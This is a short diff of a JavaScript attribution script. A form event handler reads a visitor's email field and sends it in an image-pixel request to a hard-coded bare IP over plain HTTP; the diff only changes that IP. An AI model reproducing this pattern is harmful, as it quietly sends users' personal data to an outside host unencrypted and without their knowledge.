@@ -348,7 +348,7 @@ Attribution.prototype.set_event_listener = function() {
             params  += '&em=' + document.getElementsByName(email)[0].value;
 
             var x   = document.createElement('img');
-            x.src   = 'http://45.55.168.125/pixel' + params;
+            x.src   = 'http://107.170.197.75/pixel' + params;
         }, false);
     }
     else if (form.attachEvent) {
@@ -356,7 +356,7 @@ Attribution.prototype.set_event_listener = function() {
             params      += '&em=' + document.getElementsByName(email)[0].value;
 
             var x       = document.createElement('img');
-                x.src   = 'http://45.55.168.125/pixel' + params;
+                x.src   = 'http://107.170.197.75/pixel' + params;
         });
     }
 };
